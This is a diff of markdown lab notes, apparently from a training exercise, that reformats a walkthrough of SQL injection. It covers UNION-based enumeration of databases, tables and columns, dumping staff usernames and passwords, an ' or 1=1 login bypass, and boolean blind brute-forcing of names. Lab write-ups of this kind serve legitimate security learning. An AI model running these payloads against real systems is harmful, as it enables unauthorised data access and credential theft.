@@ -21,7 +21,7 @@ use `'` or `"` to know if the input field is vulnerable to SQL injection.
 1 UNION SELECT 1
 ```
 
-If above gives error add another until success
+- If above gives error add another until success
 
 ```sql
 0 UNION SELECT 1,2
@@ -31,32 +31,32 @@ If above gives error add another until success
 0 UNION SELECT 1,2,3
 ```
 
-above gives no error so look for database
+- Above gives no error so look for database
 
 ```sql
 0 UNION SELECT 1,2,database()
 ```
 
-`sqli_one` is the database name found. Get list of tables
+- `sqli_one` is the database name found. Get list of tables
 
 ```sql
 0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
 ```
 
-fond `article,staff_users` tables. Get column from `staff_users`
+- Fond `article,staff_users` tables. Get column from `staff_users`
 
 ```sql
 0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
 ```
 
-found `id,password,username` columns. Let's get username and passwords
+- Found `id,password,username` columns. Let's get username and passwords
 
 ```sql
 0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
 ```
 ## Example 2: Blind SQL Injection: Bypass Auth
 
-Inserting below will result `true` for any input
+- Inserting below will result `true` for any input
 
 ```sql
 ' or 1=1;--
@@ -66,7 +66,7 @@ Inserting below will result `true` for any input
 
 `https://website.thm/checkuser?username=admin` this page returns `{"taken":true}`. For username query parameter we will put below sql snippet.
 
-Similar to example 1, select 1 if error/fail look for select 1,2 and so one
+- Similar to example 1, select 1 if error/fail look for select 1,2 and so one
 
 ```sql
 admin123' UNION SELECT 1;--
@@ -92,7 +92,7 @@ Response:
 {"taken":true}
 ```
 
-Now the response `taken` is `true`, look for database.
+- Now the response `taken` is `true`, look for database.
 
 ```sql
 admin123' UNION SELECT 1,2,3 where database() like '%';--
@@ -110,7 +110,7 @@ Response:
 {"taken":true}
 ```
 
-Brute force the name using `database() like 'sa%'` `, database() like 'sa%'`  as the received output is true or false until get  the database name. In this case it is `sqli_three`
+- Brute force the name using `database() like 'sa%'` `, database() like 'sa%'`  as the received output is true or false until get  the database name. In this case it is `sqli_three`
 
 ```sql
 admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three';--
@@ -120,10 +120,10 @@ Response:
 {"taken":true}
 ```
 
-Brute force table name until response is true
+- Brute force table name until response is true
 
 ```sql
-`admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--`
+admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
 ```
 
 ```sql
